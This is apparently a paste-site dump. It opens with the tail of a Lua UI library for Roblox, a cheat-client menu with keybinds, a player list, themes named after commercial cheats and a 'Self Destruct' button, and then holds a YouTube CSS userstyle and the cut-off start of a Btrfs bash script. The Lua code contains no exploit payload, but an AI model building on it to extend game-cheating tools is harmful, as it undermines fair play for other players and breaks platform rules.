                        Size = Vector2.new(KeybindToggleInline.Size.X - 2, KeybindToggleInline.Size.Y - 2),
                        Position = Vector2.new(KeybindToggleInline.Position.X + 1, KeybindToggleInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindToggleGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(KeybindToggleInline.Size.X - 2, KeybindToggleInline.Size.Y - 2),
                        Position = Vector2.new(KeybindToggleInline.Position.X + 1, KeybindToggleInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 1,
                        Visible = true
                    })
                    --
                    local KeybindToggleValue = Utility.AddDrawing(""Text"", {
                        Text = ""Toggle"",
                        Position = Vector2.new(KeybindToggleInline.Position.X + (KeybindToggleInline.Size.X / 2), KeybindToggleInline.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    local KeybindAlwaysInline = Utility.AddDrawing(""Square"", {
                        Position = Vector2.new(SectionInline.Position.X + SectionInline.Size.X + 2 - 6, SectionInline.Position.Y + 23 + Keybind.Axis + 2 + 34),
                        Size = Vector2.new(60, 16),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindAlwaysOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(KeybindAlwaysInline.Size.X - 2, KeybindAlwaysInline.Size.Y - 2),
                        Position = Vector2.new(KeybindAlwaysInline.Position.X + 1, KeybindAlwaysInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.LightContrast, --Library.Theme.Outline,
                        Visible = true,
                        Filled = true
                    })
                    --
                    local KeybindAlwaysGradient = Utility.AddDrawing(""Image"", {
                        Size = Vector2.new(KeybindAlwaysInline.Size.X - 2, KeybindAlwaysInline.Size.Y - 2),
                        Position = Vector2.new(KeybindAlwaysInline.Position.X + 1, KeybindAlwaysInline.Position.Y + 1),
                        Data = Library.Theme.Gradient,
                        Transparency = 1,
                        Visible = true
                    })
                    --
                    local KeybindAlwaysValue = Utility.AddDrawing(""Text"", {
                        Text = ""Always"",
                        Position = Vector2.new(KeybindAlwaysInline.Position.X + (KeybindAlwaysInline.Size.X / 2), KeybindAlwaysInline.Position.Y),
                        Center = true,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Color = Library.Theme.Text,
                        Visible = true,
                        ZIndex = 2
                    })
                    --
                    function Keybind:Drop(State)
                        KeybindHoldInline.Visible = State
                        KeybindHoldOutline.Visible = State
                        KeybindHoldGradient.Visible = State
                        KeybindHoldValue.Visible = State

                        KeybindToggleInline.Visible = State
                        KeybindToggleOutline.Visible = State
                        KeybindToggleGradient.Visible = State
                        KeybindToggleValue.Visible = State

                        KeybindAlwaysInline.Visible = State
                        KeybindAlwaysOutline.Visible = State
                        KeybindAlwaysGradient.Visible = State
                        KeybindAlwaysValue.Visible = State
                    end
                    --
                    function Keybind:SetStateType(State)
                        if State == ""Hold"" then
                            Keybind.StateType = ""Hold""

                            KeybindAlwaysValue.Color = Library.Theme.Text
                            KeybindToggleValue.Color = Library.Theme.Text
                            KeybindHoldValue.Color = Library.Theme.Accent[1]
                        elseif State == ""Toggle"" then
                            Keybind.StateType = ""Toggle""

                            KeybindAlwaysValue.Color = Library.Theme.Text
                            KeybindToggleValue.Color = Library.Theme.Accent[1]
                            KeybindHoldValue.Color = Library.Theme.Text
                        else
                            Keybind.StateType = ""Always""

                            KeybindAlwaysValue.Color = Library.Theme.Accent[1]
                            KeybindToggleValue.Color = Library.Theme.Text
                            KeybindHoldValue.Color = Library.Theme.Text

                            Keybind.State = true
                            Keybind.Callback(Keybind.State, Keybind.Key)
                        end
                    end
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                            if Keybind.Binding then
                                Keybind.Binding = false
                                Keybind.Key = Enum.UserInputType.MouseButton1
                                Keybind.EnumType = ""UserInputType""
                                Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                            end
                            if Utility.OnMouse(KeybindInline) then
                                for Index, Value in pairs(Tab.Dropdowns[Side]) do
                                    if Index ~= KeybindTitle.Text and Value then
                                        return
                                    end
                                end
                                if Keybind.Binding then
                                    Keybind.Binding = false
                                    KeybindValue.Text = Keybind.Shorten
                                else
                                    Keybind.Binding = true
                                    KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                                end
                            end
                            if Utility.OnMouse(KeybindHoldInline) then
                                Keybind:SetStateType(""Hold"")
                            end
                            if Utility.OnMouse(KeybindToggleInline) then
                                Keybind:SetStateType(""Toggle"")
                            end
                            if Utility.OnMouse(KeybindAlwaysInline) then
                                Keybind:SetStateType(""Always"")
                            end
                        elseif Input.UserInputType == Enum.UserInputType.Keyboard then
                            if Keybind.Binding then
                                Keybind.Binding = false
                                Keybind.Key = Input.KeyCode
                                Keybind.EnumType = ""KeyCode""
                                Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                            end
                        elseif Input.UserInputType == Enum.UserInputType.MouseButton2 then
                            if Keybind.Binding then
                                Keybind.Binding = false
                                Keybind.Key = Enum.UserInputType.MouseButton2
                                Keybind.EnumType = ""UserInputType""
                                Keybind.Shorten = Library.Keys.Shortened[Keybind.Key.Name] or Keybind.Key.Name
                                KeybindValue.Text = Keybind.Binding and ""[...]"" or Keybind.Shorten
                            end
                            if Utility.OnMouse(KeybindInline) then
                                Keybind.Dropped = not Keybind.Dropped
                                Keybind:Drop(Keybind.Dropped)
                            end
                        end
                    end)
                    --
                    Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                        
                        if (Keybind.EnumType == ""KeyCode"" and Input.KeyCode == Keybind.Key) or (Keybind.EnumType == ""UserInputType"" and Input.UserInputType == Keybind.Key) then
                            if Keybind.StateType == ""Toggle"" then
                                Keybind.State = not Keybind.State
                            elseif Keybind.StateType == ""Hold"" then
                                Keybind.State = true
                            end
                            Keybind.Callback(Keybind.State, Keybind.Key)
                        end
                    end)
                    --
                    Keybind:SetStateType(Keybind.StateType)
                    --
                    Utility.AddConnection(UserInput.InputEnded, function(Input, Useless)
                        
                        if (Keybind.EnumType == ""KeyCode"" and Input.KeyCode == Keybind.Key) or (Keybind.EnumType == ""UserInputType"" and Input.UserInputType == Keybind.Key) then
                            if Keybind.StateType == ""Hold"" then
                                Keybind.State = false
                                Keybind.Callback(Keybind.State, Keybind.Key)
                            end
                        end
                    end)
                    --
                    Keybind:Drop(false)
                    --
                    Section.ContentAxis = Section.ContentAxis + KeybindInline.Size.Y + 8
                    Tab.SectionAxis = {
                        Side == ""Left"" and Tab.SectionAxis[1] +  KeybindInline.Size.Y + 8 or Tab.SectionAxis[1], 
                        Side == ""Right"" and Tab.SectionAxis[2] +  KeybindInline.Size.Y + 8 or Tab.SectionAxis[2]
                    }
                    --
                    self:UpdateSizeY(Section.ContentAxis + KeybindInline.Size.Y)
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = KeybindTitle
                    Tab[""Render""][#Tab[""Render""] + 1] = KeybindInline
                    Tab[""Render""][#Tab[""Render""] + 1] = KeybindOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = KeybindValue
                    Tab[""Render""][#Tab[""Render""] + 1] = KeybindGradient
                    --
                    return Keybind
                end
                --
                return Section
            end
            --
            Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
                if Useless then
                    return
                end
                if Input.UserInputType == Enum.UserInputType.MouseButton1 and Utility.OnMouse(TabInline) then
                    task.spawn(function()
                        --[[
                            local Speed = 4
                            local Distance = (TabLine.Position.X - TabOutline.Position.X < 0) and 1 + (Tab.CurrentTab + (#self.Tabs - self.SelectedTab)) * Speed or 1 + ((#self.Tabs - Tab.CurrentTab) + self.SelectedTab) * Speed
                            local Calculation = (TabLine.Position.X - TabOutline.Position.X < 0) and Distance or -Distance
                            for Index = TabLine.Position.X, TabOutline.Position.X, Calculation do
                                TabLine.Position = Vector2.new(Index, TabLine.Position.Y)
                                task.wait()
                            end
                            TabLine.Size = Vector2.new(TabOutline.Size.X, 1)
                            TabLine.Position = Vector2.new(TabOutline.Position.X, TabLine.Position.Y)
                        ]]
                        
                        self:SwitchTab(Tab)
                    end)
                end
            end)
            --
            function Tab:AddPlayerlist()
                local PlayerList = {
                    PlayersInList = 0
                }
                --
                local PlayerListTabInline = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(SecondBorderOutline.Size.X - 16, 40),
                    Position = Vector2.new(SecondBorderOutline.Position.X + 8, SecondBorderOutline.Position.Y + 6),
                    Thickness = 0,
                    Color = Library.Theme.Inline,
                    Visible = true,
                    Filled = true
                })
                --
                local PlayerListTabOutline = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(PlayerListTabInline.Size.X - 2, PlayerListTabInline.Size.Y - 2),
                    Position = Vector2.new(PlayerListTabInline.Position.X + 1, PlayerListTabInline.Position.Y + 1),
                    Thickness = 0,
                    Color = Library.Theme.Outline,
                    Visible = true,
                    Filled = true
                })
                --
                local PlayerListPage = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(PlayerListTabOutline.Size.X - 4, PlayerListTabOutline.Size.Y - 4),
                    Position = Vector2.new(PlayerListTabOutline.Position.X + 2, PlayerListTabOutline.Position.Y + 2),
                    Thickness = 0,
                    Color = Library.Theme.DarkContrast,
                    Visible = true,
                    Filled = true
                })
                --
                local PlayerListTopline = Utility.AddDrawing(""Square"", {
                    Size = Vector2.new(PlayerListTabOutline.Size.X, 1),
                    Position = Vector2.new(PlayerListTabOutline.Position.X, PlayerListTabOutline.Position.Y),
                    Thickness = 0,
                    Color = Library.Theme.Accent[1],
                    Visible = true,
                    Filled = true
                })
                --
                local PlayerListTitle = Utility.AddDrawing(""Text"", {
                    Text = ""Player List"",
                    Outline = false,
                    Font = Library.Theme.Font,
                    Size = Library.Theme.TextSize,
                    Position = Vector2.new(PlayerListTabInline.Position.X + 4, PlayerListTabInline.Position.Y + 4),
                    Color = Library.Theme.Text,
                    Visible = true
                })
                --
                local PlayerListName = Utility.AddDrawing(""Text"", {
                    Text = ""Name"",
                    Outline = false,
                    Font = Library.Theme.Font,
                    Size = Library.Theme.TextSize,
                    Position = Vector2.new(PlayerListTabInline.Position.X + 6, PlayerListTabInline.Position.Y + 20),
                    Color = Library.Theme.Text,
                    Visible = true
                })
                --
                local PlayerListTeam = Utility.AddDrawing(""Text"", {
                    Text = ""Team"",
                    Outline = false,
                    Font = Library.Theme.Font,
                    Size = Library.Theme.TextSize,
                    Position = Vector2.new(PlayerListTabInline.Position.X + 182, PlayerListTabInline.Position.Y + 20),
                    Color = Library.Theme.Text,
                    Visible = true
                })
                --
                local PlayerListStatus = Utility.AddDrawing(""Text"", {
                    Text = ""Status"",
                    Outline = false,
                    Font = Library.Theme.Font,
                    Size = Library.Theme.TextSize,
                    Position = Vector2.new(PlayerListTabInline.Position.X + 334, PlayerListTabInline.Position.Y + 20),
                    Color = Library.Theme.Text,
                    Visible = true
                })
                --
                function PlayerList:RefreshList(Int)
                    PlayerListTabInline.Size = Vector2.new(SecondBorderOutline.Size.X - 16, (22 * Int) + 37)
                    --
                    PlayerListTabOutline.Size = Vector2.new(PlayerListTabInline.Size.X - 2, PlayerListTabInline.Size.Y - 2)
                    PlayerListTabOutline.Position = Vector2.new(PlayerListTabInline.Position.X + 1, PlayerListTabInline.Position.Y + 1)
                    --
                    PlayerListPage.Size = Vector2.new(PlayerListTabOutline.Size.X - 4, PlayerListTabOutline.Size.Y - 4)
                    PlayerListPage.Position = Vector2.new(PlayerListTabOutline.Position.X + 2, PlayerListTabOutline.Position.Y + 2)
                end
                --
                function PlayerList:AddPlayer(Player)
                    PlayerList.PlayersInList += 1
                    local CurrentList, Removed = PlayerList.PlayersInList, false
                    --
                    local PlayerTabInline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(PlayerListTabInline.Size.X - 2, 22),
                        Position = Vector2.new(PlayerListTabInline.Position.X + 1, (PlayerListTabInline.Position.Y + 15) + (PlayerList.PlayersInList * 22)),
                        Thickness = 0,
                        Color = Library.Theme.Inline,
                        Visible = Window.SelectedTab == ""Settings"",
                        Filled = true
                    })
                    --
                    local PlayerTabOutline = Utility.AddDrawing(""Square"", {
                        Size = Vector2.new(PlayerTabInline.Size.X - 2, PlayerTabInline.Size.Y - 2),
                        Position = Vector2.new(PlayerTabInline.Position.X + 1, PlayerTabInline.Position.Y + 1),
                        Thickness = 0,
                        Color = Library.Theme.Outline,
                        Visible = Window.SelectedTab == ""Settings"",
                        Filled = true
                    })
                    --
                    local PlayerName = Utility.AddDrawing(""Text"", {
                        Text = Player.Name,
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Position = Vector2.new(PlayerTabInline.Position.X + 4, PlayerTabInline.Position.Y + 4),
                        Color = Library.Theme.Text,
                        Visible = Window.SelectedTab == ""Settings""
                    })
                    --
                    local PlayerTeam = Utility.AddDrawing(""Text"", {
                        Text = Player.Team ~= nil and Player.Team.Name or ""Neutral"",
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Position = Vector2.new(PlayerTabInline.Position.X + 180, PlayerTabInline.Position.Y + 4),
                        Color = Player.Team ~= nil and Player.TeamColor.Color or Library.Theme.TextInactive,
                        Visible = Window.SelectedTab == ""Settings""
                    })
                    --
                    local PlayerStatus = Utility.AddDrawing(""Text"", {
                        Text = Player == LocalPlayer and ""Client"" or ""None"",
                        Outline = false,
                        Font = Library.Theme.Font,
                        Size = Library.Theme.TextSize,
                        Position = Vector2.new(PlayerTabInline.Position.X + 330, PlayerTabInline.Position.Y + 4),
                        Color = Player == LocalPlayer and Library.Theme.Accent[1] or Library.Theme.Text,
                        Visible = Window.SelectedTab == ""Settings""
                    })
                    --
                    Tab[""Render""][#Tab[""Render""] + 1] = PlayerTabInline
                    Tab[""Render""][#Tab[""Render""] + 1] = PlayerTabOutline
                    Tab[""Render""][#Tab[""Render""] + 1] = PlayerName
                    Tab[""Render""][#Tab[""Render""] + 1] = PlayerTeam
                    Tab[""Render""][#Tab[""Render""] + 1] = PlayerStatus
                    --
                    self:RefreshList(CurrentList)
                    --
                    Utility.AddConnection(Library.Communication.Event, function(Type, User)
                        if Type == ""RemovePlayer"" then
                            if User == Player.Name then
                                Tab:RemoveDrawing(PlayerTabInline)
                                Tab:RemoveDrawing(PlayerTabOutline)
                                Tab:RemoveDrawing(PlayerName)
                                Tab:RemoveDrawing(PlayerTeam)
                                Tab:RemoveDrawing(PlayerStatus)
                                --
                                --[[
                                    Utility.RemoveDrawing(PlayerTabInline)
                                    Utility.RemoveDrawing(PlayerTabOutline)
                                    Utility.RemoveDrawing(PlayerName)
                                    Utility.RemoveDrawing(PlayerTeam)
                                    Utility.RemoveDrawing(PlayerStatus)
                                ]]
                            end
                            CurrentList -= 1
                            self:RefreshList(CurrentList)
                        end
                    end)
                end
                --
                function PlayerList:RemovePlayer(Player)
                    PlayerList[Player.Name] = {}
                    --
                    Library.Communication:Fire(""RemovePlayer"", Player.Name)
                    --
                    PlayerList.PlayersInList -= 1
                    self:RefreshList(PlayerList.PlayersInList)
                end
                --
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListTabInline
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListTabOutline
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListTopline
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListName
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListTeam
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListStatus
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListPage
                Tab[""Render""][#Tab[""Render""] + 1] = PlayerListTitle
                --
                return PlayerList
            end
            --
            Tab[""TabInline""] = TabInline
            Tab[""TabOutline""] = TabOutline
            Tab[""TabTitle""] = TabTitle
            --
            Tab:Install()
            --
            Window.LastTab = TabInline
            self.Tabs[#self.Tabs + 1] = Tab
            -- self:RefreshPages()
            Tab[""Render""] = {}
            return Tab
        end
        --
        function Window:AddSettingsTab(Additional)
            Additional = typeof(Additional) == ""function"" and Additional or function() end

            local LocalTheme = {
                Accent = Library.Theme.Accent[1],
                Outline = Color3.fromHex(""#000005""),
                Inline = Color3.fromHex(""#323232""),
                LightContrast = Color3.fromHex(""#202020""),
                DarkContrast = Color3.fromHex(""#191919""),
                Text = Color3.fromHex(""#e8e8e8""),
                TextInactive = Color3.fromHex(""#aaaaaa"")
            }

            local Settings = Window:Tab(""Settings"")

            local Theme = Settings:Section(""Theme"", ""Left"")
            
            Theme:Colorpicker({Title = ""Accent"", Color = LocalTheme.Accent, Flag = ""UIAccent"", Callback = function(Color)
                Library:UpdateTheme({
                    Accent = Color
                })
                LocalTheme.Accent = Color
            end})
            
            Theme:Colorpicker({Title = ""Outline"", Color = LocalTheme.Outline, Flag = ""UIOutline"", Callback = function(Color)
                Library:UpdateTheme({
                    Outline = Color
                })
                LocalTheme.Outline = Color
            end})
            
            Theme:Colorpicker({Title = ""Inline"", Color = LocalTheme.Inline, Flag = ""UIInline"", Callback = function(Color)
                Library:UpdateTheme({
                    Inline = Color
                })
                LocalTheme.Inline = Color
            end})
            
            Theme:Colorpicker({Title = ""Inline Contrast"", Color = LocalTheme.LightContrast, Flag = ""UILightContrast"", Callback = function(Color)
                Library:UpdateTheme({
                    LightContrast = Color
                })
                LocalTheme.LightContrast = Color
            end})
            
            Theme:Colorpicker({Title = ""Dark Contrast"", Color = LocalTheme.DarkContrast, Flag = ""UIDarkContrast"", Callback = function(Color)
                Library:UpdateTheme({
                    DarkContrast = Color
                })
                LocalTheme.DarkContrast = Color
            end})
            
            Theme:Colorpicker({Title = ""Text"", Color = LocalTheme.Text, Flag = ""UIText"", Callback = function(Color)
                Library:UpdateTheme({
                    Text = Color
                })
                LocalTheme.Text = Color
            end})
            
            Theme:Colorpicker({Title = ""Text Inactive"", Color = LocalTheme.TextInactive, Flag = ""UITextInactive"", Callback = function(Color)
                Library:UpdateTheme({
                    TextInactive = Color
                })
                LocalTheme.TextInactive = Color
            end})
            
            Theme:Dropdown({
                Title = ""Theme"",
                List = {""Default"", ""Neverlose"", ""Fatality"", ""Aimware"", ""Onetap"", ""Vape"", ""Gamesesne"", ""OldAbyss""},
                Default = ""Default"",
                Callback = function(Choosen)
                    if Choosen == ""Default"" then
                        Library:UpdateTheme({
                            Accent = Color3.fromHex(""#7583fa""),
                            Outline = Color3.fromHex(""#000005""),
                            Inline = Color3.fromHex(""#323232""),
                            LightContrast = Color3.fromHex(""#202020""),
                            DarkContrast = Color3.fromHex(""#191919""),
                            Text = Color3.fromHex(""#e8e8e8""),
                            TextInactive = Color3.fromHex(""#aaaaaa"")
                        })
                    elseif Choosen == ""Neverlose"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#000005""),
                            Inline = Color3.fromHex(""#0a1e28""),
                            Accent = Color3.fromHex(""#00b4f0""),
                            Text = Color3.fromHex(""#ffffff""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#000f1e""),
                            DarkContrast = Color3.fromHex(""#050514""),
                        })
                    elseif Choosen == ""Octohook"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#000000""),
                            Inline = Color3.fromHex(""#3c3c3c""),
                            Accent = Color3.fromHex(""#8f4b67""),
                            Text = Color3.fromHex(""#ffffff""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#171717""),
                            DarkContrast = Color3.fromHex(""#121112""),
                        })
                    elseif Choosen == ""Fatality"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#322850""),
                            Inline = Color3.fromHex(""#3c3c3c""),
                            Accent = Color3.fromHex(""#f00f50""),
                            Text = Color3.fromHex(""#c8c8ff""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#231946""),
                            DarkContrast = Color3.fromHex(""#191432""),
                        })
                    elseif Choosen == ""Aimware"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#000005""),
                            Inline = Color3.fromHex(""#373737""),
                            Accent = Color3.fromHex(""#c82828""),
                            Text = Color3.fromHex(""#e8e8e8""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#2b2b2b""),
                            DarkContrast = Color3.fromHex(""#191919""),
                        })
                    elseif Choosen == ""Onetap"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#000000""),
                            Inline = Color3.fromHex(""#4e5158""),
                            Accent = Color3.fromHex(""#dda85d""),
                            Text = Color3.fromHex(""#d6d9e0""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#2c3037""),
                            DarkContrast = Color3.fromHex(""#1f2125""),
                        })
                    elseif Choosen == ""Vape"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#0a0a0a""),
                            Inline = Color3.fromHex(""#363636""),
                            Accent = Color3.fromHex(""#26866a""),
                            Text = Color3.fromHex(""#d6d9e0""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#1f1f1f""),
                            DarkContrast = Color3.fromHex(""#1a1a1a""),
                        })
                    elseif Choosen == ""Gamesesne"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#000000""),
                            Inline = Color3.fromHex(""#4e5158""),
                            Accent = Color3.fromHex(""#a7d94d""),
                            Text = Color3.fromHex(""#ffffff""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#171717""),
                            DarkContrast = Color3.fromHex(""#0c0c0c""),
                        })
                    elseif Choosen == ""OldAbyss"" then
                        Library:UpdateTheme({
                            Outline = Color3.fromHex(""#0a0a0a""),
                            Inline = Color3.fromHex(""#322850""),
                            Accent = Color3.fromHex(""#8c87b4""),
                            Text = Color3.fromHex(""#ffffff""),
                            TextInactive = Color3.fromHex(""#afafaf""),
                            LightContrast = Color3.fromHex(""#1e1e1e""),
                            DarkContrast = Color3.fromHex(""#141414""),
                        })
                    end
                end
            })
            
            local ClickGUI = Settings:Section(""Click GUI"", ""Right"")
            
            ClickGUI:Toggle({
                Title = ""Enable Anime"",
                Callback = function(State)
                    Window.ToggleAnime(State)
                end
            })
            
            ClickGUI:Dropdown({
                Title = ""Anime"",
                List = {""Astolfo"", ""Violet"", ""Rem"", ""Aiko"", ""Asuka""},
                Default = ""Astolfo"",
                Callback = function(Name)
                    Window.ChangeAnime(Name)
                end
            })

            ClickGUI:Button({
                Title = ""Self Destruct"",
                Callback = function()
                    Library.SelfDestruct()
                    Additional()
                end
            })

            return Settings
        end
        --
        function Window.Watermark(Title)
            local Watermark = {
                Title = Title,
                FPS = 60,
                Visible = true
            }
            --
            local WindowOutline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(475, 24),
                Position = Vector2.new(150, 8),
                Thickness = 0,
                Color = Library.Theme.Outline,
                Visible = true,
                Filled = true
            }, Library.Watermark)
            --
            local WatermarkIcon = Utility.AddDrawing(""Image"", {
                Size = Vector2.new(18, 20),
                Position = Vector2.new(WindowOutline.Position.X + 2, WindowOutline.Position.Y + 2),
                Transparency = 1,
                ZIndex = 3,
                Visible = true,
                Data = Library.Theme.Logo
            }, Library.Watermark)
            --
            local WindowOutlineBorder = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2),
                Position = Vector2.new(WindowOutline.Position.X + 1, WindowOutline.Position.Y + 1),
                Thickness = 0,
                Color = Library.Theme.Accent[1],
                Visible = false,
                Filled = true
            }, Library.Watermark)
            --
            local WindowFrame = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutlineBorder.Size.X - 2, WindowOutlineBorder.Size.Y - 2),
                Position = Vector2.new(WindowOutlineBorder.Position.X + 1, WindowOutlineBorder.Position.Y + 1),
                Thickness = 0,
                Transparency = 1,
                Color = Library.Theme.DarkContrast,
                Visible = true,
                Filled = true
            }, Library.Watermark)
            --
            local WindowTopline = Utility.AddDrawing(""Square"", {
                Size = Vector2.new(WindowOutlineBorder.Size.X, 1),
                Position = Vector2.new(WindowOutlineBorder.Position.X, WindowOutlineBorder.Position.Y),
                Thickness = 0,
                Color = Library.Theme.Accent[1],
                Visible = true,
                Filled = true
            }, Library.Watermark)
            --
            Utility.AddConnection(Library.Communication.Event, function(Type, Color)
                if Type == ""Accent"" then
                    WindowOutlineBorder.Color = Color
                    WindowTopline.Color = Color
                end
            end)
            --
            local WindowImage = Utility.AddDrawing(""Image"", {
                Size = WindowFrame.Size,
                Position = WindowFrame.Position,
                Transparency = 1, 
                Visible = true,
                Data = Library.Theme.Gradient
            }, Library.Watermark)
            --
            local WindowTitle = Utility.AddDrawing(""Text"", {
                Font = Library.Theme.Font,
                Size = Library.Theme.TextSize,
                Color = Library.Theme.Text,
                Text = Watermark.Title .. "" | "" .. (""%s, %s, %s""):format(os.date(""%B""), os.date(""%d""), os.date(""%Y"")),
                Position = Vector2.new(WindowFrame.Position.X + (WindowFrame.Size.X / 2), WindowOutlineBorder.Position.Y + 4),
                Visible = true,
                Center = false,
                Outline = false
            }, Library.Watermark)
            --
            WindowOutline.Size = Vector2.new(WindowTitle.TextBounds.X + 19, 20)
            WindowTopline.Size = Vector2.new(WindowOutline.Size.X - 2, 2)
            WindowFrame.Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2)
            --
            --[[
                Utility.Loop(1, function()
                    WindowTitle.Text = (""%s | Ping: %s ms | FPS: %s fps""):format(Watermark.Title, tostring(math.floor(Stats:GetValue())), Watermark.FPS)
                    Watermark.FPS = 0
                end)
            ]]
            Utility.AddDrag(WindowOutline, Library.Watermark)
            --
            Utility.AddConnection(RunService.RenderStepped, function()
                Watermark.FPS += 1
                if Watermark.Visible then
                    local Hours, Minutes, Secs = os.date(""*t"")[""hour""], os.date(""*t"")[""min""], os.date(""*t"")[""sec""]
                    local Format = Hours > 12 and Hours - 12 or Hours
                    local AMORPM = Hours > 12 and ""PM"" or ""AM""
                    local FixZero = string.len(tostring(Secs)) == 1 and ""0"" .. Secs or Secs
                    WindowTitle.Text =  (""%s | %s:%s:%s %s | %s, %s, %s, %s""):format(Watermark.Title, Format, Minutes, FixZero, AMORPM, os.date(""%A""), os.date(""%B""), os.date(""%d""), os.date(""%Y""))

                    WindowOutline.Visible = true
                    WindowImage.Visible = true
                    --
                    WindowOutline.Size = Vector2.new(WindowTitle.TextBounds.X + 28, 22)
                    WindowOutlineBorder.Size = WindowOutline.Size
                    WindowTopline.Size = Vector2.new(WindowOutline.Size.X - 2, 1)
                    WindowFrame.Size = Vector2.new(WindowOutline.Size.X - 2, WindowOutline.Size.Y - 2)
                    WindowImage.Size = WindowFrame.Size
                    WindowTitle.Position = Vector2.new(WindowTopline.Position.X + 22, WindowTopline.Position.Y + 4)
                    --
                    WindowFrame.Visible = true
                    WindowTitle.Visible = true
                    WatermarkIcon.Visible = true
                    WindowTopline.Visible = true
                else
                    WatermarkIcon.Visible = false
                    WindowOutline.Visible = false
                    WindowFrame.Visible = false
                    WindowTitle.Visible = false
                    WindowTopline.Visible = false
                end
            end)
            --
            return Watermark
        end

        return Window
    end
end

--
Utility.AddConnection(UserInput.InputBegan, function(Input, Useless)
    if Useless then
        return
    end
    if Input.KeyCode == Enum.KeyCode.RightShift then
        Library:ChangeVisible(not Library.WindowVisible)
    end
end)
--
local Maid = {
    Connections = {}
}

Maid.AddConnection = function(Specific, Type, Callback)
    local Connection = Type:Connect(Callback)

    Specific = Specific or #Maid.Connections + 1
    Maid.Connections[Specific] = Connection
    
    return Connection
end

Maid.DelConnection = function(Specific)
    Maid.Connections[Specific]:Disconnect()
end

Maid.DisconnectAll = function()
    for Idx, Val in pairs(Maid.Connections) do
        Val:Disconnect()
    end
end"
C0Mk5LXL,YouTube Full Theater,kyrodes,CSS,Wednesday 28th of June 2023 08:11:27 PM CDT,"@-moz-document url-prefix(""https://www.youtube.com/watch"") {
ytd-watch-flexy[theater] #player-wide-container.ytd-watch-flexy,
ytd-watch-flexy[fullscreen] #player-wide-container.ytd-watch-flexy{
  transition: max-height 1s ease;
  height: 100vh;
  max-height: 100vh;
}
/*.html5-video-player .video-stream,*/
.ytp-iv-video-content {
    height: 100vh!important;
    width:100vw!important;
    left:0!important;
    top:0!important;
}
#page-manager.ytd-app {
  margin-top: 0;
}
#masthead-container {
  opacity: 0;
  transition:0.5s;
}
#content:hover #masthead-container {
  opacity: 0.75;
  animation: stylus-fadeout 0.5s 3s forwards;
}
@keyframes stylus-fadeout {
  from {opacity: 0.75;}
  to {opacity: 0;}
}
#content:hover #masthead-container:focus-within,
#masthead-container:focus-within {
  opacity: 1!important;
}
#masthead {
  --yt-swatch-primary: rgba(0,0,0,0.5)!important;
  transition: 0.25s;
}
#content:hover #masthead-container:focus-within #masthead,
#masthead-container:focus-within #masthead {
  --yt-swatch-primary: rgb(35,35,35)!important;
}
}"
EfQ6Avgk,btrfs_umount.sh,fant0men,Bash,Wednesday 28th of June 2023 08:07:16 PM CDT,"#!/bin/bash

# This script is just meant to clean up the mountpoints of the Btrfs
# (pseudo-RAID / JBOD) partition (data: single, metadata: raid1) on my
